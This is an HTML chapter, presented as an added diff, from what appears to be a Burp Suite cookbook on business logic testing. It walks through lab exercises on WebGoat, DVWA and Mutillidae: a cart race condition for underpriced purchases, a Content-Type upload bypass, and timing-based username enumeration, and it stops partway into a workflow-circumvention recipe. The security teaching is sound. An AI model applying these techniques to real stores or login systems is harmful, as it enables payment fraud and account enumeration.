@@ -1,0 +1,559 @@
+<html><head></head><body>
+		<div id="_idContainer422">
+			<h1 id="_idParaDest-149" class="chapter-number"><a id="_idTextAnchor392"/>7</h1>
+			<h1 id="_idParaDest-150"><a id="_idTextAnchor393"/>Assessing Business Logic</h1>
+			<p>This chapter covers the basics of <strong class="bold">business logic testing</strong>, including an explanation of some of the more common tests performed in this area. Web penetration testing involves key assessments of business logic to determine how well the design of an application performs integrity checks, especially within sequential application function steps, and we will be learning how to use Burp Suite to perform <span class="No-Break">such tests.</span></p>
+			<p><a id="_idTextAnchor394"/>In this chapter, we will cover the <span class="No-Break">following recipes:</span></p>
+			<ul>
+				<li>Testing business logic <span class="No-Break">data validation</span></li>
+				<li>Unrestricted file upload—bypassing <span class="No-Break">weak validation</span></li>
+				<li>Performing <span class="No-Break">process-timing attacks</span></li>
+				<li>Testing for the circumvention <span class="No-Break">of workflows</span></li>
+				<li>Uploading <span class="No-Break">malicious files—polyglots</span><a id="_idTextAnchor395"/></li>
+			</ul>
+			<h1 id="_idParaDest-151"><a id="_idTextAnchor396"/>Technical requirements</h1>
+			<p>To complete the recipes in this chapter, you will need <span class="No-Break">the following:</span></p>
+			<ul>
+				<li>OWASP <strong class="bold">Broken Web Applications</strong> (<strong class="bold">BWA</strong>) </li>
+				<li>OWASP <span class="No-Break">Mutillidae link</span></li>
+				<li>OWASP <span class="No-Break">WebGoat link</span></li>
+				<li>OWASP <strong class="bold">Damn Vulnerable Web Application</strong> (<span class="No-Break"><strong class="bold">DVWA</strong></span><span class="No-Break">) link</span></li>
+				<li>Burp Proxy Community or <span class="No-Break">Professional (</span><a href="https://portswigger.net/burp/"><span class="No-Break">https://portswigger.net/burp/</span></a><span class="No-Break">)</span></li>
+				<li>Firefox browser using FoxyProxy add-on or Burp <span class="No-Break">Suite browser</span><a id="_idTextAnchor397"/></li>
+			</ul>
+			<h1 id="_idParaDest-152"><a id="_idTextAnchor398"/>Testing business logic data validation</h1>
+			<p>Business logic data validation errors occur due to a lack of server-side checks, especially in a sequence of events such as <a id="_idIndexMarker450"/>shopping cart checkouts. If design flaws such as thread issues are present, those flaws may allow an attacker to modify or change their shopping cart contents or prices prior to purchasing them, to lower the <span class="No-Break">price paid<a id="_idTextAnchor399"/>.</span><a id="_idTextAnchor400"/></p>
+			<h2 id="_idParaDest-153"><a id="_idTextAnchor401"/>Getting ready</h2>
+			<p>Using the <strong class="bold">OWASP WebGoat</strong> application and<a id="_idIndexMarker451"/> Burp, we will exploit a business logic design flaw to purchase many large ticket items for a very <span class="No-Break">cheap pric<a id="_idTextAnchor402"/>e<a id="_idTextAnchor403"/>.</span></p>
+			<h2 id="_idParaDest-154"><a id="_idTextAnchor404"/>How to do it...</h2>
+			<ol>
+				<li>Ensure the <strong class="source-inline">owaspbwa</strong> VM is running. Select the <strong class="bold">OWASP WebGoat</strong> application from the initial landing page of the VM. The landing page will be configured to an IP address specific to <span class="No-Break">your machine:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer372" class="IMG---Figure">
+					<img src="image/B21173_07_001.jpg" alt="Figure 7.1 – VM landing page"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.1 – VM landing page</p>
+			<ol>
+				<li value="2">After you’ve clicked the <strong class="bold">OWASP WebGoat</strong> link, you will be prompted for some login credentials. Use these credentials—username: <strong class="source-inline">guest</strong>; <span class="No-Break">password: </span><span class="No-Break"><strong class="source-inline">guest</strong></span><span class="No-Break">.</span></li>
+				<li>After authentication, click the <strong class="bold">Start WebGoat</strong> button to access the <span class="No-Break">application exercises:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer373" class="IMG---Figure">
+					<img src="image/B21173_07_002.jpg" alt="Figure 7.2 – Starting the WebGoat application"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.2 – Starting the WebGoat application</p>
+			<ol>
+				<li value="4">Note the WebGoat application seems to work better in Firefox with FoxyProxy set to send <a id="_idIndexMarker452"/>traffic to Burp Suite instead of using the Burp Suite browser. Click <strong class="bold">Concurrency</strong> | <strong class="bold">Shopping Cart Concurrency Flaw</strong> from the <span class="No-Break">left-hand menu:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer374" class="IMG---Figure">
+					<img src="image/B21173_07_003.jpg" alt="Figure 7.3 – Shopping Cart Concurrency Flaw"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.3 – Shopping Cart Concurrency Flaw</p>
+			<p>The exercise explains there is a thread issue in the design of the shopping cart that will allow us to <a id="_idIndexMarker453"/>purchase items at a lower price. Let’s exploit the <span class="No-Break">design flaw!</span></p>
+			<ol>
+				<li value="5">Add <strong class="source-inline">1</strong> to the <strong class="bold">Quantity</strong> box for the <strong class="bold">Sony - Vaio with Intel Centrino</strong> item. Click the <strong class="bold">Update </strong><span class="No-Break"><strong class="bold">Cart</strong></span><span class="No-Break"> button:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer375" class="IMG---Figure">
+					<img src="image/B21173_07_004.jpg" alt="Figure 7.4 – Adding one Sony Vaio to the cart"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.4 – Adding one Sony Vaio to the cart</p>
+			<ol>
+				<li value="6">Switch to Burp Suite’s <strong class="bold">Proxy</strong> | <strong class="bold">HTTP history</strong> tabs. Find the cart request, right-click, and click <strong class="bold">Send </strong><span class="No-Break"><strong class="bold">to Repeater</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer376" class="IMG---Figure">
+					<img src="image/B21173_07_005.jpg" alt="Figure 7.5 – Send to Repeater"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.5 – Send to Repeater</p>
+			<ol>
+				<li value="7">Inside<a id="_idIndexMarker454"/> Burp Suite’s <strong class="bold">Repeater</strong> tab, change the <strong class="source-inline">QTY3</strong> parameter from <strong class="source-inline">1</strong> <span class="No-Break">to </span><span class="No-Break"><strong class="source-inline">10</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer377" class="IMG---Figure">
+					<img src="image/B21173_07_006.jpg" alt="Figure 7.6 – Increasing the quantity to three"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.6 – Increasing the quantity to three</p>
+			<ol>
+				<li value="8">Stay in<a id="_idIndexMarker455"/> Burp Suite’s <strong class="bold">Repeater</strong> tab and, in the request pane, right-click and select <strong class="bold">Request in browser</strong> | <strong class="bold">In current </strong><span class="No-Break"><strong class="bold">browser session</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer378" class="IMG---Figure">
+					<img src="image/B21173_07_007.jpg" alt="Figure 7.7 – Viewing the request in the current browser session"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.7 – Viewing the request in the current browser session</p>
+			<ol>
+				<li value="9">A popup displays the modified request. Click the <span class="No-Break"><strong class="bold">Copy</strong></span><span class="No-Break"> button:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer379" class="IMG---Figure">
+					<img src="image/B21173_07_008.jpg" alt="Figure 7.8 – Copying the link"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.8 – Copying the link</p>
+			<ol>
+				<li value="10">Using the <a id="_idIndexMarker456"/>same Firefox browser containing the shopping cart, open a new tab and paste in the URL that you copied into the clipboard in the <span class="No-Break">previous step:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer380" class="IMG---Figure">
+					<img src="image/B21173_07_009.jpg" alt="Figure 7.9 – Pasting the link into a new browser tab"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.9 – Pasting the link into a new browser tab</p>
+			<ol>
+				<li value="11">Press the <em class="italic">Enter</em> key to see the request resubmitted with a modified quantity <span class="No-Break">of </span><span class="No-Break"><strong class="source-inline">10</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer381" class="IMG---Figure">
+					<img src="image/B21173_07_010.jpg" alt="Figure 7.10 – Seeing the updated quantity"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.10 – Seeing the updated quantity</p>
+			<p>Switch to the original tab containing your shopping cart (the cart with the original quantity of <strong class="source-inline">1</strong>). Click the <span class="No-Break"><strong class="bold">Purchase</strong></span><span class="No-Break"> button:</span></p>
+			<div>
+				<div id="_idContainer382" class="IMG---Figure">
+					<img src="image/B21173_07_011.jpg" alt="Figure 7.11 – Purchasing the item on the original tab"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.11 – Purchasing the item on the original tab</p>
+			<ol>
+				<li value="12">At the next<a id="_idIndexMarker457"/> screen, before clicking the <strong class="bold">Confirm</strong> button, switch to the second tab and update the cart again, but this time with our new quantity of <strong class="source-inline">10</strong>, and click on <span class="No-Break"><strong class="bold">Update Cart</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer383" class="IMG---Figure">
+					<img src="image/B21173_07_012.jpg" alt="Figure 7.12 – Updating the cart on the second tab"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.12 – Updating the cart on the second tab</p>
+			<ol>
+				<li value="13">Return to the first tab, and click the <span class="No-Break"><strong class="bold">Confirm</strong></span><span class="No-Break"> button:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer384" class="IMG---Figure">
+					<img src="image/B21173_07_013.jpg" alt="Figure 7.13 – Confirming the purchase on the first tab"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.13 – Confirming the purchase on the first tab</p>
+			<p>Notice we were <a id="_idIndexMarker458"/>able to purchase 10 Sony Vaio laptops for the price <span class="No-Break">of 1!</span></p>
+			<div>
+				<div id="_idContainer385" class="IMG---Figure">
+					<img src="image/B21173_07_014.jpg" alt="Figure 7.14 – All items in the cart were purchased at a lower price"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.14 – All items in the cart were purchased at a lower price</p>
+			<h2 id="_idParaDest-155">How <a id="_idTextAnchor405"/>i<a id="_idTextAnchor406"/>t works...</h2>
+			<p>Thread safety issues<a id="_idIndexMarker459"/> can produce unintended results. For many languages, the developer’s knowledge of how to declare variables and methods as thread-safe is imperative. Threads that are not isolated, such as the cart contents shown in this recipe, can result in users gaining unintended discounts <span class="No-Break">on products.</span></p>
+			<h1 id="_idParaDest-156">Unr<a id="_idTextAnchor407"/>e<a id="_idTextAnchor408"/>stricted file upload – bypassing weak validation</h1>
+			<p>Many applications allow for files to be<a id="_idIndexMarker460"/> uploaded for various reasons. Business logic on the server side must include checking for acceptable files; this is known as <strong class="bold">whitelisting</strong>. If such checks are <a id="_idIndexMarker461"/>weak or only address one aspect of file attributes (for example, file extensions only), attackers can exploit these weaknesses and upload unexpected file types that may be executable on <span class="No-Break">the server.</span></p>
+			<h2 id="_idParaDest-157">G<a id="_idTextAnchor409"/>e<a id="_idTextAnchor410"/>tting ready</h2>
+			<p>Using the DVWA application and Burp, we will exploit a business logic design flaw in the file <span class="No-Break">upload page.</span></p>
+			<h2 id="_idParaDest-158">H<a id="_idTextAnchor411"/>o<a id="_idTextAnchor412"/>w to do it...</h2>
+			<ol>
+				<li>Ensure the <strong class="source-inline">owaspbwa</strong> VM is running. Select <strong class="bold">DVWA</strong> from the initial landing page of the VM. The landing page will be configured to an IP address specific to <span class="No-Break">your machine.</span></li>
+				<li>On the login page, use<a id="_idIndexMarker462"/> these credentials—username: <strong class="source-inline">user</strong>; <span class="No-Break">password: </span><span class="No-Break"><strong class="source-inline">user</strong></span><span class="No-Break">.</span></li>
+				<li>Select the <strong class="bold">DVWA Security</strong> option from the menu on the left. Change the default setting of <strong class="bold">low</strong> to <strong class="bold">medium</strong> and then <span class="No-Break">click </span><span class="No-Break"><strong class="bold">Submit</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer386" class="IMG---Figure">
+					<img src="image/B21173_07_015.jpg" alt="Figure 7.15 – Setting security to medium"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.15 – Setting security to medium</p>
+			<ol>
+				<li value="4">Select the <strong class="bold">Upload</strong> page from the menu on <span class="No-Break">the left:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer387" class="IMG---Figure">
+					<img src="image/B21173_07_016.jpg" alt="Figure 7.16 – Going to the Upload page"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.16 – Going to the Upload page</p>
+			<ol>
+				<li value="5">Note the page instructs<a id="_idIndexMarker463"/> users to only upload images. If we try another type of file other than a JPG image, we receive an error message in the upper <span class="No-Break">left-hand corner:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer388" class="IMG---Figure">
+					<img src="image/B21173_07_017.jpg" alt="Figure 7.17 – Only images are allowed"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.17 – Only images are allowed</p>
+			<ol>
+				<li value="6">On your local machine, create a file of any type, other than JPG. For example, create a Microsoft Excel file called <strong class="source-inline">malicious_spreadsheet.xlsx</strong>. It does not need to have any content for the purpose of <span class="No-Break">this recipe.</span></li>
+				<li>Switch to Burp Suite’s <strong class="bold">Proxy</strong> | <strong class="bold">Intercept</strong> tab. Turn the interceptor on with the <strong class="bold">Intercept is </strong><span class="No-Break"><strong class="bold">on</strong></span><span class="No-Break"> button.</span></li>
+				<li>Return to Firefox, use the <strong class="bold">Browse</strong> button to find the <strong class="source-inline">malicious_spreadsheet.xlsx</strong> file on your system, and click the <span class="No-Break"><strong class="bold">Upload</strong></span><span class="No-Break"> button:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer389" class="IMG---Figure">
+					<img src="image/B21173_07_018.jpg" alt="Figure 7.18 – Attempting to upload an Excel spreadsheet"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.18 – Attempting to upload an Excel spreadsheet</p>
+			<ol>
+				<li value="9">With the request paused in <a id="_idIndexMarker464"/>Burp Suite’s <strong class="bold">Proxy</strong> | <strong class="bold">Intercept</strong> tab, change the <strong class="source-inline">Content-Type</strong> value from <strong class="source-inline">application/vnd.openxmlformats-officedocument.spreadsheetml.sheet</strong> to <span class="No-Break"><strong class="source-inline">image/jpeg</strong></span><span class="No-Break"> instead.</span></li>
+			</ol>
+			<p>Here is <span class="No-Break">the original:</span></p>
+			<div>
+				<div id="_idContainer390" class="IMG---Figure">
+					<img src="image/B21173_07_019.jpg" alt="Figure 7.19 – Original Content-Type value"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.19 – Original Content-Type value</p>
+			<p>Here is the <span class="No-Break">modified version:</span></p>
+			<div>
+				<div id="_idContainer391" class="IMG---Figure">
+					<img src="image/B21173_07_020.jpg" alt="Figure 7.20 – Modified Content-Type value"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.20 – Modified Content-Type value</p>
+			<ol>
+				<li value="10">Click the <strong class="bold">Forward</strong> button. Now, turn the interceptor off by clicking the toggle button to <strong class="bold">Intercept </strong><span class="No-Break"><strong class="bold">is off</strong></span><span class="No-Break">.</span></li>
+				<li>Note the file was uploaded successfully! We were able to bypass the weak data validation checks and upload a file other than <span class="No-Break">an image:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer392" class="IMG---Figure">
+					<img src="image/B21173_07_021.jpg" alt="Figure 7.21 – Spreadsheet is successfully uploaded"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.21 – Spreadsheet is successfully uploaded</p>
+			<h2 id="_idParaDest-159">How i<a id="_idTextAnchor413"/>t<a id="_idTextAnchor414"/> works...</h2>
+			<p>Due to weak server-side checks, we<a id="_idIndexMarker465"/> can easily circumvent the image-only restriction and upload a file type of our choice. The application code only checks for content types matching <strong class="source-inline">image/jpeg</strong>, which is easily modified with an intercepting proxy such as Burp. Developers need to simultaneously whitelist both content-type as well as file extensions in the application code to prevent this type of exploit <span class="No-Break">from occurring.</span></p>
+			<h1 id="_idParaDest-160">Perf<a id="_idTextAnchor415"/>o<a id="_idTextAnchor416"/>rming process-timing attacks</h1>
+			<p>By monitoring the time an<a id="_idIndexMarker466"/> application takes to complete a task, it is possible for attackers to gather or infer information about how an application is coded. For example, a login process using a valid username receives a response quicker than the same login process given an invalid username. This delay in response time leaks information related to system processes. An attacker could use a response time to perform account enumeration and determine valid usernames based on the timing of <span class="No-Break">the response.</span></p>
+			<h2 id="_idParaDest-161">Get<a id="_idTextAnchor417"/>t<a id="_idTextAnchor418"/>ing ready</h2>
+			<p>For this recipe, you will need the <strong class="source-inline">common_pass.txt</strong> wordlist from <strong class="source-inline">wfuzz</strong>, <span class="No-Break">available here:</span></p>
+			<p><a href="https://github.com/xmendez/wfuzz"><span class="No-Break">https://github.com/xmendez/wfuzz</span></a></p>
+			<p>Here’s the path <span class="No-Break">to this:</span></p>
+			<p><strong class="source-inline">wordlist</strong> | <strong class="source-inline">others</strong> | <span class="No-Break"><strong class="source-inline">common_pass.txt</strong></span></p>
+			<p>Using OWASP Mutillidae II, we will determine whether the application provides information leakage based on the response time from <span class="No-Break">forced logins.</span></p>
+			<p>Ensure Burp Suite is running, and also ensure that the <strong class="source-inline">owaspbwa</strong> VM is running and that Burp Suite is configured in the<a id="_idIndexMarker467"/> Firefox browser used to view <span class="No-Break"><strong class="source-inline">owaspbwa</strong></span><span class="No-Break"> applications.</span></p>
+			<h2 id="_idParaDest-162">Ho<a id="_idTextAnchor419"/>w<a id="_idTextAnchor420"/> to do it...</h2>
+			<ol>
+				<li>From the <strong class="source-inline">owaspbwa</strong> landing page, click the link to the OWASP Mutillidae <span class="No-Break">II application.</span></li>
+				<li>Open Firefox browser to the home of OWASP Mutillidae II (<span class="No-Break">URL: </span><span class="No-Break"><strong class="source-inline">http://&lt;your_VM_assigned_IP_address&gt;/mutillidae/</strong></span><span class="No-Break">).</span></li>
+				<li>Go to the login page and log in using the username <strong class="source-inline">ed</strong> and the <span class="No-Break">password </span><span class="No-Break"><strong class="source-inline">pentest</strong></span><span class="No-Break">.</span></li>
+				<li>Switch to Burp Suite’s <strong class="bold">Proxy</strong> | <strong class="bold">HTTP history</strong> tab, find the login you just performed, right-click, and select <strong class="bold">Send </strong><span class="No-Break"><strong class="bold">to Intruder</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer393" class="IMG---Figure">
+					<img src="image/B21173_07_022.jpg" alt="Figure 7.22 – Sending a POST request of the login to Repeater"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.22 – Sending a POST request of the login to Repeater</p>
+			<ol>
+				<li value="5">Go to the <strong class="bold">Intruder</strong> | <strong class="bold">Positions</strong> tab and<a id="_idIndexMarker468"/> clear all the payload markers, using the <strong class="bold">Clear §</strong> button on the <span class="No-Break">right-hand side:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer394" class="IMG---Figure">
+					<img src="image/B21173_07_023.jpg" alt="Figure 7.23 – Clearing any suggested positions"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.23 – Clearing any suggested positions</p>
+			<ol>
+				<li value="6">As shown in the following screenshot, select the username field and click the <strong class="bold">Add §</strong> button to wrap <a id="_idIndexMarker469"/>a payload marker around that field. Also, replace the valid password with an invalid password instead—for <span class="No-Break">example, </span><span class="No-Break"><strong class="source-inline">xx</strong></span><span class="No-Break">:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer395" class="IMG---Figure">
+					<img src="image/B21173_07_024.jpg" alt="Figure 7.24 – Adding substitution markers around the username value"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.24 – Adding substitution markers around the username value</p>
+			<ol>
+				<li value="7">Also, remove the <strong class="source-inline">PHPSESSID</strong> token. Delete the value present in this token (the content following the equals sign) and leave it blank. This step is very important because if you happen to leave<a id="_idIndexMarker470"/> this token in the requests, you will be unable to see the difference in the timings since the application will think you are already <span class="No-Break">logged in:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer396" class="IMG---Figure">
+					<img src="image/B21173_07_025.jpg" alt="Figure 7.25 – Removing the PHPSESSID cookie value"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.25 – Removing the PHPSESSID cookie value</p>
+			<ol>
+				<li value="8">Go to the <strong class="bold">Intruder</strong> | <strong class="bold">Payloads</strong> tab. Within the <strong class="bold">Payload Options [Simple list]</strong> section, we will add some<a id="_idIndexMarker471"/> invalid values by using a wordlist from <strong class="source-inline">wfuzz</strong> containing common <span class="No-Break">passwords (</span><span class="No-Break"><strong class="source-inline">wfuzz/wordlists/others/common_pass.txt</strong></span><span class="No-Break">):</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer397" class="IMG---Figure">
+					<img src="image/B21173_07_026.jpg" alt="Figure 7.26 – Loading the wordlist"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.26 – Loading the wordlist</p>
+			<ol>
+				<li value="9">Scroll to the bottom and uncheck the checkbox in the <strong class="bold">Payload </strong><span class="No-Break"><strong class="bold">encoding</strong></span><span class="No-Break"> section:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer398" class="IMG---Figure">
+					<img src="image/B21173_07_027.jpg" alt="Figure 7.27 – Unchecking the box in the Payload encoding section"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.27 – Unchecking the box in the Payload encoding section</p>
+			<ol>
+				<li value="10">Click the <strong class="bold">Start attack</strong> button. An<a id="_idIndexMarker472"/> attack results table appears. Let the attacks complete. From the attack results table, select <strong class="bold">Columns</strong> and check <strong class="bold">Response received</strong>. Check <strong class="bold">Response completed</strong> to add these columns to the attack <span class="No-Break">results table:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer399" class="IMG---Figure">
+					<img src="image/B21173_07_028.jpg" alt="Figure 7.28 – Adding two extra columns to the attack results table"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.28 – Adding two extra columns to the attack results table</p>
+			<ol>
+				<li value="11">Analyze the results provided. According to OWASP (<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing">https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing</a>), the steps to perform this test include providing a valid username (that is, <strong class="source-inline">ed</strong>) with an invalid password and looking at the amount of time for the response to return from the server. Then, perform the test again using an invalid username and an invalid password. You are looking for a difference in response time (faster or slower) when the server reaches a valid username versus an <span class="No-Break">invalid username.</span></li>
+			</ol>
+			<p>From the results of our<a id="_idIndexMarker473"/> test, we see the fastest response is when the server is provided a valid username with an <span class="No-Break">invalid password:</span></p>
+			<div>
+				<div id="_idContainer400" class="IMG---Figure">
+					<img src="image/B21173_07_029.jpg" alt="Figure 7.29 – Analyzing the results"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.29 – Analyzing the results</p>
+			<h2 id="_idParaDest-163">How <a id="_idTextAnchor421"/>i<a id="_idTextAnchor422"/>t works...</h2>
+			<p>Information leakage can occur when processing error messages or through invalid coding paths that take longer than valid code paths. Developers must ensure the business logic does not give away such clues <span class="No-Break">to attackers.</span></p>
+			<h2 id="_idParaDest-164">There<a id="_idTextAnchor423"/>’s more...</h2>
+			<p>We can use a Burp Suite extension called <strong class="bold">Timeinator</strong> that can help us identify process timing attacks but with more requests for a better <span class="No-Break">sample size.</span></p>
+			<ol>
+				<li>Download the Burp Suite extension from the <strong class="bold">BApp Store</strong> subtab. Click the <span class="No-Break"><strong class="bold">Install</strong></span><span class="No-Break"> button:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer401" class="IMG---Figure">
+					<img src="image/B21173_07_030.jpg" alt="Figure 7.30 – Installing the Timeinator extension"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.30 – Installing the Timeinator extension</p>
+			<ol>
+				<li value="2">Right-click the<a id="_idIndexMarker474"/> request we used in <strong class="bold">Intruder</strong> and send the same to the <span class="No-Break"><strong class="bold">Timeinator</strong></span><span class="No-Break"> plugin:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer402" class="IMG---Figure">
+					<img src="image/B21173_07_031.jpg" alt="Figure 7.31 – Sending the Intruder request to Timeinator"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.31 – Sending the Intruder request to Timeinator</p>
+			<ol>
+				<li value="3">Inside <strong class="bold">Timeinator</strong>, add a substitution marker around <strong class="source-inline">username</strong>. Type three names (<strong class="source-inline">tom</strong>, <strong class="source-inline">xx</strong>, <strong class="source-inline">ed</strong>) in the text area to be replaced in the <span class="No-Break">substitution position:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer403" class="IMG---Figure">
+					<img src="image/B21173_07_032.jpg" alt="Figure 7.32 – Adding a substitution marker and payloads"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.32 – Adding a substitution marker and payloads</p>
+			<ol>
+				<li value="4">Click <strong class="bold">Start Attack</strong> at the top. Once <a id="_idIndexMarker475"/>done, switch over to the <strong class="bold">Results</strong> tab of <strong class="bold">Timeinator</strong> to read the heat map produced. Notice the valid username with an invalid password has a much larger standard deviation than the other login attempts using invalid usernames. Due to the larger sampling size and additional math computations, you may feel more confident about your process timing <span class="No-Break">attack finding:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer404" class="IMG---Figure">
+					<img src="image/B21173_07_033.jpg" alt="Figure 7.33 – Starting the attack and analyzing the results"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.33 – Starting the attack and analyzing the results</p>
+			<h1 id="_idParaDest-165">Testing<a id="_idTextAnchor424"/> for the circumvention of workflows</h1>
+			<p>Shopping cart to payment<a id="_idIndexMarker476"/> gateway interactions must be tested by web application penetration testers to ensure the workflow cannot be performed out of sequence. A payment should never be made unless verification of the cart contents is checked on the server side first. In the event this check is missing, an attacker can change the price, quantity, or both, prior to the <span class="No-Break">actual purchase.</span></p>
+			<h2 id="_idParaDest-166">Getti<a id="_idTextAnchor425"/>n<a id="_idTextAnchor426"/>g ready</h2>
+			<p>Using the OWASP WebGoat application and Burp, we will exploit a business logic design flaw in which there is no server-side validation prior to <span class="No-Break">a purchase.</span></p>
+			<h2 id="_idParaDest-167">How t<a id="_idTextAnchor427"/>o<a id="_idTextAnchor428"/> do it...</h2>
+			<ol>
+				<li>Ensure the <strong class="source-inline">owaspbwa</strong> VM is running. Select the OWASP WebGoat application from the initial landing page of the VM. The landing page will be configured to an IP address specific to <span class="No-Break">your machine.</span></li>
+				<li>After you’ve clicked the <strong class="bold">OWASP WebGoat</strong> link, you will be prompted for login credentials. Use these credentials—username: <strong class="source-inline">guest</strong>; <span class="No-Break">password: </span><span class="No-Break"><strong class="source-inline">guest</strong></span><span class="No-Break">.</span></li>
+				<li>After authentication, click the <strong class="bold">Start WebGoat</strong> button to access the <span class="No-Break">application exercises.</span></li>
+				<li>Click <strong class="bold">AJAX Security</strong> | <strong class="bold">Insecure Client Storage</strong> from the left-hand menu. You are presented with a <span class="No-Break">shopping cart:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer405" class="IMG---Figure">
+					<img src="image/B21173_07_034.jpg" alt="Figure 7.34 – Insecure Client Storage lesson"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.34 – Insecure Client Storage lesson</p>
+			<ol>
+				<li value="5">Switch to<a id="_idIndexMarker477"/> Burp Suite’s <strong class="bold">Proxy</strong> | <strong class="bold">HTTP history</strong> tab, click the <strong class="bold">Filter</strong> button, and ensure your <strong class="bold">Filter by MIME type</strong> section includes <strong class="bold">Script</strong>. If <strong class="bold">Script</strong> is not checked, be sure to check <span class="No-Break">it now:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer406" class="IMG---Figure">
+					<img src="image/B21173_07_035.jpg" alt="Figure 7.35 – Including Script in the traffic history"/>
+				</div>
+			</div>
+			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.35 – Including Script in the traffic history</p>
+			<ol>
+				<li value="6">Return to the Firefox browser with <a id="_idIndexMarker478"/>WebGoat and specify a quantity of <strong class="source-inline">2</strong> for the <strong class="bold">Hewlett-Packard – Pavilion Notebook with Intel® </strong><span class="No-Break"><strong class="bold">Centrino™</strong></span><span class="No-Break"> item:</span></li>
+			</ol>
+			<div>
+				<div id="_idContainer407" class="IMG---Figure">
+					<img src="image/B21173_07_036.jpg" alt="Figure 7.36 – Updating the cart with two Hewlett-Packard notebooks"/>
+				</div>
+			</div>
